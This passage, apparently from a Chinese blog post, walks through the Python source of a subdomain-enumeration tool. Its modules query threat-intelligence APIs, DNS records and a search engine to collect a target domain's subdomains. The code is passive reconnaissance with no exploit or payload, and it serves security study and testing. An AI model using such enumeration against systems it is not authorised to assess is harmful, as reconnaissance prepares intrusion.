= self.get(addr, param)<br>        self.subdomains = self.collect_subdomains(resp)<br></code></pre></div></td></tr></table></figure><h2 id="3-23-wzpc"><a href="#3-23-wzpc" class="headerlink" title="3.23 wzpc"></a>3.23 wzpc</h2><p>携带对应的请求参数访问对应的网址，并将返回的内容进行正则匹配子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WZPCQuery</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Dataset&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;WZPCQuery&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br><br>        base_addr = <span class="hljs-string">&#x27;http://114.55.181.28/check_web/&#x27;</span> \<br>                    <span class="hljs-string">&#x27;databaseInfo_mainSearch.action&#x27;</span><br>        page_num = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            time.sleep(self.delay)<br>            self.header = self.get_header()<br>            self.proxy = self.get_proxy(self.source)<br>            params = &#123;<span class="hljs-string">&#x27;isSearch&#x27;</span>: <span class="hljs-string">&#x27;true&#x27;</span>, <span class="hljs-string">&#x27;searchType&#x27;</span>: <span class="hljs-string">&#x27;url&#x27;</span>,<br>                      <span class="hljs-string">&#x27;term&#x27;</span>: self.domain, <span class="hljs-string">&#x27;pageNo&#x27;</span>: page_num&#125;<br>            <span class="hljs-keyword">try</span>:<br>                resp = self.get(base_addr, params)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, e.args)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>                <span class="hljs-keyword">break</span><br>            subdomains = self.match_subdomains(resp.text)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> subdomains:  <span class="hljs-comment"># 没有发现子域名则停止查询</span><br>                <span class="hljs-keyword">break</span><br>            self.subdomains.update(subdomains)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> subdomains:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> page_num &gt; <span class="hljs-number">10</span>:<br>                <span class="hljs-keyword">break</span><br>            page_num += <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><h1 id="4-dnsquery"><a href="#4-dnsquery" class="headerlink" title="4. dnsquery"></a>4. dnsquery</h1><h2 id="4-1-mx"><a href="#4-1-mx" class="headerlink" title="4.1 mx"></a>4.1 mx</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">QueryMX</span>(<span class="hljs-params">Lookup</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        <span class="hljs-comment"># 初始化为Lookup对象</span><br>        Lookup.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;dnsquery&#x27;</span><br>        self.source = <span class="hljs-string">&quot;QueryMX&quot;</span><br>        <span class="hljs-comment"># 设置具体查询内容</span><br>        self.<span class="hljs-built_in">type</span> = <span class="hljs-string">&#x27;MX&#x27;</span>  <span class="hljs-comment"># 利用的DNS记录的MX记录收集子域</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        类执行入口</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.begin()<br>        <span class="hljs-comment"># 到lookup中的query中查询utils.dns_query即返回dns查询的mx内容之后调用函数match_subdomains对内容进行匹配添加subdomain</span><br>        self.query()<br>        self.finish()<br>        self.save_json()<br>        self.gen_result()<br>        self.save_db()<br><br><span class="hljs-comment"># 统一调用入口</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">domain</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    类统一调用入口</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param str domain: 域名</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    query = QueryMX(domain)<br>    query.run()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    run(<span class="hljs-string">&#x27;cuit.edu.cn&#x27;</span>)<br><br></code></pre></div></td></tr></table></figure><p>之后的ns,soa,spf,txt均是只修改了self.qtype的值为对应查询内容，此处不过多赘述</p><h1 id="5-intelligence"><a href="#5-intelligence" class="headerlink" title="5. intelligence"></a>5. intelligence</h1><h2 id="5-1-alienvault"><a href="#5-1-alienvault" class="headerlink" title="5.1 alienvault"></a>5.1 alienvault</h2><p>类似datasetsd的模式，也是请求后获取返回内容匹配子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AlienVault</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Intelligence&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;AlienVaultQuery&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br><br>        base = <span class="hljs-string">&#x27;https://otx.alienvault.com/api/v1/indicators/domain&#x27;</span><br>        dns = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;base&#125;</span>/<span class="hljs-subst">&#123;self.domain&#125;</span>/passive_dns&#x27;</span><br>        resp = self.get(dns)<br>        self.subdomains = self.collect_subdomains(resp)<br><br>        url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;base&#125;</span>/<span class="hljs-subst">&#123;self.domain&#125;</span>/url_list&#x27;</span><br>        resp = self.get(url)<br>        self.subdomains = self.collect_subdomains(resp)<br><br></code></pre></div></td></tr></table></figure><h2 id="5-2-riskiq-api"><a href="#5-2-riskiq-api" class="headerlink" title="5.2 riskiq_api"></a>5.2 riskiq_api</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RiskIQ</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Intelligence&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;RiskIQAPIQuery&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://api.passivetotal.org/v2/enrichment/subdomains&#x27;</span><br>        self.user = settings.riskiq_api_username<br>        self.key = settings.riskiq_api_key<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        params = &#123;<span class="hljs-string">&#x27;query&#x27;</span>: self.domain&#125;<br>        resp = self.get(url=self.addr,<br>                        params=params,<br>                        auth=(self.user, self.key))<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>            <span class="hljs-keyword">return</span><br>        data = resp.json()<br>        names = data.get(<span class="hljs-string">&#x27;subdomains&#x27;</span>)<br>        subdomain_str = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">set</span>(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> name: <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;name&#125;</span>.<span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span>, names)))<br>        self.subdomains = self.collect_subdomains(subdomain_str)<br></code></pre></div></td></tr></table></figure><h2 id="5-3-threatbook-api"><a href="#5-3-threatbook-api" class="headerlink" title="5.3 threatbook_api"></a>5.3 threatbook_api</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ThreatBookAPI</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Intelligence&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;ThreatBookAPIQuery&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://api.threatbook.cn/v3/domain/sub_domains&#x27;</span><br>        self.key = settings.threatbook_api_key<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        params = &#123;<span class="hljs-string">&#x27;apikey&#x27;</span>: self.key,<br>                  <span class="hljs-string">&#x27;resource&#x27;</span>: self.domain&#125;<br>        resp = self.post(self.addr, params)<br>        self.subdomains = self.collect_subdomains(resp)<br><br></code></pre></div></td></tr></table></figure><h2 id="5-4-threatminer"><a href="#5-4-threatminer" class="headerlink" title="5.4 threatminer"></a>5.4 threatminer</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ThreatMiner</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Intelligence&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;ThreatMinerQuery&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://www.threatminer.org/getData.php&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        params = &#123;<span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-string">&#x27;subdomains_container&#x27;</span>,<br>                  <span class="hljs-string">&#x27;q&#x27;</span>: self.domain, <span class="hljs-string">&#x27;t&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;rt&#x27;</span>: <span class="hljs-number">10</span>&#125;<br>        resp = self.get(self.addr, params)<br>        self.subdomains = self.collect_subdomains(resp)<br></code></pre></div></td></tr></table></figure><h2 id="5-5-virustotal"><a href="#5-5-virustotal" class="headerlink" title="5.5 virustotal"></a>5.5 virustotal</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">最多查询100条</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">VirusTotal</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.source = <span class="hljs-string">&#x27;VirusTotalQuery&#x27;</span><br>        self.module = <span class="hljs-string">&#x27;Intelligence&#x27;</span><br>        self.domain = domain<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        next_cursor = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            self.header = self.get_header()<br>            self.header.update(&#123;<span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;https://www.virustotal.com/&#x27;</span>,<br>                                <span class="hljs-string">&#x27;TE&#x27;</span>: <span class="hljs-string">&#x27;Trailers&#x27;</span>&#125;)<br>            self.proxy = self.get_proxy(self.source)<br>            params = &#123;<span class="hljs-string">&#x27;limit&#x27;</span>: <span class="hljs-string">&#x27;40&#x27;</span>, <span class="hljs-string">&#x27;cursor&#x27;</span>: next_cursor&#125;<br>            addr = <span class="hljs-string">f&#x27;https://www.virustotal.com/ui/domains/<span class="hljs-subst">&#123;self.domain&#125;</span>/subdomains&#x27;</span><br>            resp = self.get(url=addr, params=params)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>                <span class="hljs-keyword">break</span><br>            subdomains = self.match_subdomains(resp)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> subdomains:<br>                <span class="hljs-keyword">break</span><br>            self.subdomains.update(subdomains)<br>            data = resp.json()<br>            next_cursor = data.get(<span class="hljs-string">&#x27;meta&#x27;</span>).get(<span class="hljs-string">&#x27;cursor&#x27;</span>)<br></code></pre></div></td></tr></table></figure><h2 id="5-6-virustotal-api"><a href="#5-6-virustotal-api" class="headerlink" title="5.6 virustotal_api"></a>5.6 virustotal_api</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">VirusTotalAPI</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Intelligence&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;VirusTotalAPIQuery&#x27;</span><br>        self.key = settings.virustotal_api_key<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        next_cursor = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            self.header = self.get_header()<br>            self.header.update(&#123;<span class="hljs-string">&#x27;x-apikey&#x27;</span>: self.key&#125;)<br>            self.proxy = self.get_proxy(self.source)<br>            params = &#123;<span class="hljs-string">&#x27;limit&#x27;</span>: <span class="hljs-string">&#x27;40&#x27;</span>, <span class="hljs-string">&#x27;cursor&#x27;</span>: next_cursor&#125;<br>            addr = <span class="hljs-string">f&#x27;https://www.virustotal.com/api/v3/domains/<span class="hljs-subst">&#123;self.domain&#125;</span>/subdomains&#x27;</span><br>            resp = self.get(url=addr, params=params)<br>            subdomains = self.match_subdomains(resp)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> subdomains:<br>                <span class="hljs-keyword">break</span><br>            self.subdomains.update(subdomains)<br>            data = resp.json()<br>            next_cursor = data.get(<span class="hljs-string">&#x27;meta&#x27;</span>).get(<span class="hljs-string">&#x27;cursor&#x27;</span>)<br></code></pre></div></td></tr></table></figure><h1 id="6-search"><a href="#6-search" class="headerlink" title="6. search"></a>6. search</h1><h2 id="6-1-ask"><a href="#6-1-ask" class="headerlink" title="6.1 ask"></a>6.1 ask</h2><p>此模块下，方式略微不同于之前的模块当时基本原理相似，此处进行分析</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ask</span>(<span class="hljs-params">Search</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        <span class="hljs-comment"># 初始化Search对象 以及其他内容</span><br>        Search.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Search&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;AskSearch&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://www.search.ask.com/web&#x27;</span><br>        self.limit_num = <span class="hljs-number">200</span>  <span class="hljs-comment"># 限制搜索条数</span><br>        self.per_page_num = <span class="hljs-number">10</span>  <span class="hljs-comment"># 默认每页显示10页</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">self, domain, filtered_subdomain=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        发送搜索请求并做子域匹配</span><br><span class="hljs-string"></span><br><span class="hljs-string">        :param str domain: 域名</span><br><span class="hljs-string">        :param str filtered_subdomain: 过滤的子域</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.page_num = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-comment"># 睡眠防止请求过快</span><br>            time.sleep(self.delay)<br>            self.header = self.get_header()<br>            self.proxy = self.get_proxy(self.source)<br>            <span class="hljs-comment"># 设置请求参数</span><br>            query = <span class="hljs-string">&#x27;site:.&#x27;</span> + domain + filtered_subdomain<br>            params = &#123;<span class="hljs-string">&#x27;q&#x27;</span>: query, <span class="hljs-string">&#x27;page&#x27;</span>: self.page_num&#125;<br>            resp = self.get(self.addr, params)<br>            <span class="hljs-comment"># 匹配对应子域名并关闭模糊匹配</span><br>            subdomains = self.match_subdomains(resp, fuzzy=<span class="hljs-literal">False</span>)<br>            <span class="hljs-comment"># 如果没有匹配到子域名跳出</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.check_subdomains(subdomains):<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-comment"># 更新子域名情况</span><br>            self.subdomains.update(subdomains)<br>            self.page_num += <span class="hljs-number">1</span><br>            <span class="hljs-comment"># 如果达到最后一页跳出</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&gt;Next&lt;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.text:<br>                <span class="hljs-keyword">break</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        类执行入口</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.begin()<br>        self.search(self.domain)<br>        <span class="hljs-comment"># 排除同一子域搜索结果过多的子域以发现新的子域</span><br>        <span class="hljs-comment"># 跟进函数 最后返回类似如下的列表(-site:m.qq.com-site:bbs.qq.com)</span><br>        <span class="hljs-keyword">for</span> statement <span class="hljs-keyword">in</span> self.<span class="hljs-built_in">filter</span>(self.domain, self.subdomains):<br>            self.search(self.domain, filtered_subdomain=statement)<br><br>        <span class="hljs-comment"># 递归搜索下一层的子域</span><br>        <span class="hljs-comment"># 首先判断是否开启递归搜索</span><br>        <span class="hljs-keyword">if</span> self.recursive_search:<br>            <span class="hljs-comment"># 若开启则跟进函数 返回对应层数的子域名</span><br>            <span class="hljs-keyword">for</span> subdomain <span class="hljs-keyword">in</span> self.recursive_subdomain():<br>                self.search(subdomain)<br>        self.finish()<br>        self.save_json()<br>        self.gen_result()<br>        self.save_db()<br></code></pre></div></td></tr></table></figure><h3 id="6-1-1-filter"><a href="#6-1-1-filter" class="headerlink" title="6.1.1 filter"></a>6.1.1 filter</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 将外部函数集继承到类体中，即在不同实体化的情况下可直接访问该函数</span><br><span class="hljs-meta">@staticmethod</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">filter</span>(<span class="hljs-params">domain, subdomain</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    生成搜索过滤语句</span><br><span class="hljs-string">    使用搜索引擎支持的-site:语法过滤掉搜索页面较多的子域以发现新域</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param str domain: 域名</span><br><span class="hljs-string">    :param set subdomain: 子域名集合</span><br><span class="hljs-string">    :return: 过滤语句</span><br><span class="hljs-string">    :rtype: str</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># setting.common_subnames:&#123;&#x27;us&#x27;, &#x27;bbs&#x27;, &#x27;w&#x27;, &#x27;app&#x27;, &#x27;w3&#x27;, &#x27;blog&#x27;, &#x27;docs&#x27;, &#x27;mobile&#x27;, &#x27;help&#x27;, &#x27;blogs&#x27;, &#x27;web&#x27;, &#x27;news&#x27;, &#x27;m&#x27;, &#x27;i&#x27;, ...&#125;</span><br>    statements_list = []<br>    <span class="hljs-comment"># 